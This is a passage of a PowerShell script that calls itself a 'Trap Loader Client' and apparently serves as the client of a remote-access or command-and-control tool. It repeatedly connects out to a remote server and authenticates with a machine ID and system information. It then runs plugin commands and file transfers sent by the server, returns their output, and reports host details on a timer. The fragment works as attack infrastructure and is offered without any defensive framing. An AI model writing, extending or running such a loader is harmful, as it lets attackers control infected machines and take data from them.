Write-Host " Trap Loader Client (TCP)" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host " Server  : $sHost`:$sPort" -ForegroundColor Gray
Write-Host " Machine : $machineId" -ForegroundColor Gray
Write-Host " Crypto  : AES-256-GCM (BCrypt)" -ForegroundColor Gray
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

$heartbeatInterval = 5

# ==================== CONNECTION LOOP ====================

try {
while ($true) {
    $tcpClient = $null
    $stream = $null

    try {
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Connecting to $sHost`:$sPort..." -ForegroundColor Yellow

        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.NoDelay = $true
        $tcpClient.ReceiveBufferSize = 1048576
        $tcpClient.SendBufferSize = 1048576
        $tcpClient.ReceiveTimeout = 60000
        $tcpClient.SendTimeout = 30000

        $asyncResult = $tcpClient.BeginConnect($sHost, $sPort, $null, $null)
        $connected = $asyncResult.AsyncWaitHandle.WaitOne(5000, $false)

        if (-not $connected) {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Connection timeout. Retrying..." -ForegroundColor Yellow
            try { $tcpClient.Close() } catch { }
            Start-Sleep -Seconds 5
            continue
        }

        try { $tcpClient.EndConnect($asyncResult) }
        catch {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Connection refused. Retrying..." -ForegroundColor Yellow
            try { $tcpClient.Close() } catch { }
            Start-Sleep -Seconds 5
            continue
        }

        $stream = $tcpClient.GetStream()
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Connected!" -ForegroundColor Green

        # ========== AUTHENTICATION ==========

        $authJson = @{
            password   = $httpPassword
            machine_id = $machineId
            info       = $systemInfo
        } | ConvertTo-Json -Compress -Depth 5

        $authBytes = [Text.Encoding]::UTF8.GetBytes($authJson)
        Write-TcpMessage -Stream $stream -MsgType $MSG_AUTH -Payload $authBytes

        $authResp = Read-TcpMessage -Stream $stream
        if ($null -eq $authResp) {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - No auth response" -ForegroundColor Red
            throw "Auth failed"
        }

        if ($authResp.Type -eq $MSG_AUTH_FAIL) {
            $reason = if ($authResp.Payload) { [Text.Encoding]::UTF8.GetString($authResp.Payload) } else { "Unknown" }
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Auth failed: $reason" -ForegroundColor Red
            throw "Auth failed"
        }

        if ($authResp.Type -ne $MSG_AUTH_OK) {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Unexpected response: 0x$($authResp.Type.ToString('X2'))" -ForegroundColor Red
            throw "Auth failed"
        }

        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Authenticated!" -ForegroundColor Green

        # ========== MESSAGE LOOP ==========

        $lastHeartbeat = [DateTime]::UtcNow
        $lastInfoRefresh = [DateTime]::UtcNow
        $lastCleanup = [DateTime]::UtcNow
        $infoRefreshSeconds = 60
        $cleanupIntervalSeconds = 10

        while ($tcpClient.Connected) {
            $now = [DateTime]::UtcNow

            # ---- PHASE 1: Read all incoming messages ----
            while ($stream.DataAvailable) {
                $msg = Read-TcpMessage -Stream $stream
                if ($null -eq $msg) { throw "Connection lost" }

                switch ($msg.Type) {
                    $MSG_HEARTBEAT_ACK {
                        if ($msg.Payload -and $msg.Payload.Length -ge 5) {
                            $pending = [int]$msg.Payload[0] -bor ([int]$msg.Payload[1] -shl 8) -bor
                                       ([int]$msg.Payload[2] -shl 16) -bor ([int]$msg.Payload[3] -shl 24)
                            $fileQueued = $msg.Payload[4] -ne 0
                            if ($pending -gt 0 -or $fileQueued) {
                                Write-Host "$(Get-Date -Format 'HH:mm:ss') - Pending: $pending cmd(s), file=$fileQueued" -ForegroundColor Cyan
                            }
                        }
                    }
                    $MSG_PLUGIN_CMD { Handle-PluginCmd -Payload $msg.Payload }
                    $MSG_FILE_TRANSFER { Handle-FileTransfer -Payload $msg.Payload }
                    $MSG_DISCONNECT { throw "Server disconnect" }
                    default {
                        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Unknown msg: 0x$($msg.Type.ToString('X2'))" -ForegroundColor Yellow
                    }
                }
            }

            # ---- PHASE 2: Send ALL plugin output (tight loop until drained) ----
            $outputDrained = $false
            while (-not $outputDrained) {
                $sentAny = Send-AllPluginOutput -Stream $stream
                if (-not $sentAny) {
                    $outputDrained = $true
                }
                # Check for new incoming while sending output
                if ($stream.DataAvailable) { break }
            }

            # If new data arrived during output send, loop back immediately
            if ($stream.DataAvailable) { continue }

            # ---- PHASE 3: Heartbeat ----
            if (($now - $lastHeartbeat).TotalSeconds -ge $heartbeatInterval) {
                Write-TcpMessage -Stream $stream -MsgType $MSG_HEARTBEAT -Payload ([byte[]]@(0))
                $lastHeartbeat = $now
            }

            # ---- PHASE 4: System info refresh (time-based, non-blocking) ----
            if (($now - $lastInfoRefresh).TotalSeconds -ge $infoRefreshSeconds) {
                $lastInfoRefresh = $now
                $systemInfo = Get-SystemInfo
                $infoBytes = [Text.Encoding]::UTF8.GetBytes($systemInfo)
                Write-TcpMessage -Stream $stream -MsgType $MSG_CLIENT_INFO -Payload $infoBytes
            }

            # ---- PHASE 5: Dead plugin cleanup ----
            if (($now - $lastCleanup).TotalSeconds -ge $cleanupIntervalSeconds) {
                $lastCleanup = $now
                Cleanup-DeadPlugins
            }

            # ---- PHASE 6: Smart wait ----
            # Tight poll: check every 1ms for data or plugin output, max 20ms
            $waitUntil = [DateTime]::UtcNow.AddMilliseconds(20)
            while ([DateTime]::UtcNow -lt $waitUntil) {
                if ($stream.DataAvailable) { break }
                if (Get-HasPluginOutput) { break }
                [System.Threading.Thread]::Sleep(1)
            }
        }
    }
    catch {
        $errMsg = $_.Exception.Message
        if ($errMsg -ne "Auth failed" -and $errMsg -ne "Connection lost" -and $errMsg -ne "Server disconnect") {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Error: $errMsg" -ForegroundColor Red
        }
    }
    finally {
        if ($null -ne $stream) { try { $stream.Dispose() } catch { } }
        if ($null -ne $tcpClient) { try { $tcpClient.Close() } catch { } }
    }

    Write-Host "$(Get-Date -Format 'HH:mm:ss') - Reconnecting in 5s..." -ForegroundColor Yellow
    Start-Sleep -Seconds 5
}
}
finally {
    Stop-AllPlugins
}
